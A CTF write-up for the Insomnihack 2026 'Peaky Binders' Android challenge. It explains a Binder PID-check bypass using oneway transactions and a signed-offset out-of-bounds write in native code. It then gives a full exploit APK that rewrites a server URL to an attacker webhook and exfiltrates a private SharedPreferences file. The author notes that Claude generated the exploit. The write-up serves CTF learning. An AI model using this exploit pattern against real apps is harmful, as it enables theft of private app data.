# Insomnihack 2026

## Peaky Binders

In this challenge we are given a Peaky Binders APK.
The attacker can supply an APK that is executed on the same phone as the Peaky Binders APK.

Opening the apk with jadx a package named `com.peaky.binders` is the main focus of the investigation. 

The package consists of following files:

```
peaky.binders
├── AchievementAdapter.java
├── Achievement.java
├── C0842R.java
├── IPeakyService.java
├── MainActivity$$ExternalSyntheticLambda0.java
├── MainActivity$$ExternalSyntheticLambda1.java
├── MainActivity$$ExternalSyntheticLambda2.java
├── MainActivity.java
├── PeakyService.java
└── WhiskeyTastingActivity.java
```

### Triage

The app seems to be used as an Achievement Tracker:
1. Join the Shelby Family -> Enter your name to unlock
2. A true regular of the Garrison -> Visit the Garrison often
3. You've gained admin privileges -> Find the secret command

The first two achievements are trivial. For the first you have to enter a name containing `shelby`. The second requires to press a button twenty times.

The PeakyService is an exported Android Service that exposes a custom Binder interface. Through this interface, it allows external processes interact with three specific methods: `DebugCheckFile`, `isAchievmentUnlocked` and `enableDebugMode`. 
This is our entry point for the exploit.

The function `DebugCheckFile` unlocks the third achievement. This has to be the secret command.

```java
public void DebugCheckFile(byte[] bArr) throws RemoteException {
    int callingPid = Binder.getCallingPid();
    if (callingPid != 0) {
        Log.d("PeakyService", "We allow a root process only: " + callingPid);
        PeakyService.this.logToFile("DebugCheckFile called - rejected, PID: " + callingPid);
        return;
    }
    Log.d("PeakyService", "Called from a root process: " + callingPid);
    PeakyService.this.logToFile("DebugCheckFile called from root process - PID: " + callingPid);
    String str = new String(bArr);
    PeakyService.this.logToFile("Caller name: ".concat(str));
    String[] strArrRetrieveLog = PeakyService.this.RetrieveLog(str);
    if (strArrRetrieveLog != null && strArrRetrieveLog.length == 2) {
        final String serverUrl = strArrRetrieveLog[0];
        final String log_content = strArrRetrieveLog[1];
        Log.d("PeakyService", "DEBUG serverUrl: " + serverUrl);
        Log.d("PeakyService", "DEBUG logContent length: " + log_content.length());
        PeakyService.this.logToFile("DEBUG serverUrl: " + serverUrl);
        new Thread(new Runnable() { // from class: com.peaky.binders.PeakyService.1.1
            @Override // java.lang.Runnable
            public void run() {
                try {
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(serverUrl + "/logs/").openConnection();
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoOutput(true);
                    httpURLConnection.setRequestProperty("Content-Type", "text/plain");
                    OutputStream outputStream = httpURLConnection.getOutputStream();
                    outputStream.write(log_content.getBytes());
                    outputStream.flush();
                    outputStream.close();
                    Log.d("PeakyService", "HTTP Response: " + httpURLConnection.getResponseCode());
                    httpURLConnection.disconnect();
                } catch (Exception e) {
                    Log.e("PeakyService", "Failed to send logs: " + e.getMessage());
                }
            }
        }).start();
    }
    Intent intent = new Intent(PeakyService.ACTION_ACHIEVEMENT_UNLOCKED);
    intent.putExtra(PeakyService.EXTRA_ACHIEVEMENT_INDEX, 2);
    PeakyService.this.sendBroadcast(intent);
}
```

### Bypass the root requirement

The first problem to tackle is to circumvent the root check.

```java
int callingPid = Binder.getCallingPid();
if (callingPid != 0) {
    Log.d("PeakyService", "We allow a root process only: " + callingPid);
    PeakyService.this.logToFile("DebugCheckFile called - rejected, PID: " + callingPid);
    return;
}
```

The Android API reference for Binder.getCallingPid states the following https://developer.android.com/reference/android/os/Binder#getCallingPid()
> Warning do not use this as a security identifier! PID is unreliable as it may be re-used. This should mostly be used for debugging. oneway transactions do not receive PID. Even if you expect a transaction to be synchronous, a misbehaving client could send it as a asynchronous call and result in a 0 PID here. 

To abuse this bug you can use a function like this (by the courtesy of Claude):
```java
private void sendOnewayTransaction(byte[] payload) throws RemoteException {
    Parcel data = Parcel.obtain();
    data.writeInterfaceToken(TOKEN);
    data.writeByteArray(payload);

    // 1 = IBinder.FLAG_ONEWAY (Bypasses the PID 0 check)
    peakyBinder.transact(TRANSACTION, data, null, 1);
    data.recycle();
}
```
This proves there is a way to call DebugCheckFile and get our third achievement but there is still no flag in sight.

### Leak file content


Looking a bit further into the function the content and server url is fetched by `String[] strArrRetrieveLog = PeakyService.this.RetrieveLog(str)`.

```java
static {
    System.loadLibrary("peaky");
    debugMode = false;
}

public native String[] RetrieveLog(String str);
```

This just turned into a x86_64 reversing challenge!

The function accepts a Java string that acts as a command, reads the last 2048 bytes of a log file to a buffer, and returns a two-element Java String[] array containing a server URL and the log contents.

The command is parsed with `sscanf(callerNameCStr, "%15[^:]:%d:%c", callerTag, &partialOffset, &separatorChar)`.
Because of this a command has the format `"<command>:<offset>:<separator>"`.
There are two commands: `FULL` and `PARTIAL`

As per my understanding both commands only differ slightly. The `PARTIAL` command writes `separatorChar` at `partialOffset` in the buffer.

This is the logic for writing the separator into the buffer:
```
if ( *(_QWORD *)callerTag == 'LAITRAP' )      // If PARTIAL set separator
{
    clampedOffset = partialOffset;
    if ( partialOffset >= 2049 )
    {
      __android_log_print(3, "PeakyNative", "Offset is larger than buffer size");
      clampedOffset = 2048;
    }
    separatorPos = (unsigned int)(2048 - clampedOffset);
    __android_log_print(
      3,
      "PeakyNative",
      "DEBUG writing separator '%c' at content[%d]",
      (unsigned int)separatorChar,
      2048 - clampedOffset);
    g_fileBuffer[separatorPos] = separatorChar;
}
```
The security problem here is that `clampedOffset` and `partialOffset` are both signed integers.
When `clampedOffset` is negative, like `-1`, the subtraction wraps:
```
2048 - (-1) = 2049
```

`g_fileBuffer[2049]` is the first byte **past** the buffer, which lands exactly on `g_serverUrl[0]`.

Generalizing: to write to `g_serverUrl[i]` you need `separatorPos = 2049 + i` which means:
```
2048 - clampedOffset = 2049 + i
clampedOffset = -(1 + i)
```

This allows an attacker to change the URL byte for byte.
Same thing can be done with the logFilePath (here with an offset of `65` and not `1`).


Memory layout in .data:
```
g_fileBuffer    @ 0x39D8   (2049 bytes, ends at 0x41D8)
g_serverUrl     @ 0x41D9   (64 bytes)
g_logFilePath   @ 0x4219   (64 bytes)
```

Using this we now have an arbitrary file read.

### Flag location

We still need to find the Flag.
At this point I remembered that the achievements are loaded on start from a file.

```java
private SharedPreferences prefs;
private static final String PREFS_NAME = "PeakyPrefs";

protected void onCreate(Bundle bundle) {
        ...
        this.prefs = getSharedPreferences(PREFS_NAME, 0);
        ...
        loadProgress();
}

private void loadProgress() {
    this.whiskeyClicks = this.prefs.getInt(KEY_WHISKEY_CLICKS, 0);
    if (this.prefs.getBoolean(KEY_ACHIEVEMENT_1, false)) {
        this.achievements.get(0).setUnlocked(true);
    }
    if (this.prefs.getBoolean(KEY_ACHIEVEMENT_2, false)) {
        this.achievements.get(1).setUnlocked(true);
    }
    if (this.prefs.getBoolean(KEY_ACHIEVEMENT_3, false)) {
        this.achievements.get(2).setUnlocked(true);
    }
    this.adapter.notifyDataSetChanged();
}
```
I asked Claude where these SharedPreferences are stored.
It not only told me that the standard path is `/data/data/<package_name>/shared_prefs/<PREFS_NAME>.xml` it also said this is a common flag hiding spot for CTFs.


### Writing the Exploit

As I never wrote an APK before and had no Idea how to handle IPC on Android I generated the following exploit with Claude.
It feels a bit filthy but trying to first blood the challenge made me rush.

In summary the malicious APK overwrites the webhook URL and the filepath byte per byte and triggers a full read at the end.
To circumvent the `PID == 0` check the sendOnewayTransaction function from above is used.

```java

package com.hacker.exploit;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

public class MainActivity extends Activity {
    private static final String TAG = "Exploit";
    private IBinder peakyBinder;
    private static final String WEBHOOK_URL = <WEBHOOK_URL>";
    private static final String TARGET = "/data/data/com.peaky.binders/shared_prefs/PeakyPrefs.xml";

    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d(TAG, "Connected to PeakyService!");
            peakyBinder = service;
            new Thread(() -> runExploit()).start();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "Disconnected!");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d(TAG, "Starting exploit app");
        Intent intent = new Intent();
        intent.setClassName("com.peaky.binders", "com.peaky.binders.PeakyService");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    private void runExploit() {
        try {
            Log.d(TAG, "Overwriting Webhook URL");
            for (int i = 0; i < WEBHOOK_URL.length(); i++) {
                sendOnewayTransaction(("PARTIAL:" + (-(1 + i)) + ":" + WEBHOOK_URL.charAt(i)).getBytes());
                Thread.sleep(50);
            }
            // separatorChar defaults to 0x00
            sendOnewayTransaction(("PARTIAL:" + (-(1 + WEBHOOK_URL.length())) + ":").getBytes());

            for (int i = 0; i < TARGET.length(); i++) {
                sendOnewayTransaction(("PARTIAL:" + (-(65 + i)) + ":" + TARGET.charAt(i)).getBytes());
                Thread.sleep(50);
            }
            Log.d(TAG, "Exploit sent! Check your webhook.");
        } catch (Exception e) {
            Log.e(TAG, "Exploit failed", e);
        }
    }

    private void sendOnewayTransaction(byte[] payload) throws RemoteException {
        Parcel data = Parcel.obtain();
        data.writeInterfaceToken("com.peaky.binders.IPeakyService");
        data.writeByteArray(payload);

        // 1 = TRANSACTION_DebugCheckFile
        // 1 = IBinder.FLAG_ONEWAY (Bypasses the PID 0 check!)
        peakyBinder.transact(1, data, null, 1);
        data.recycle();
    }
}

```
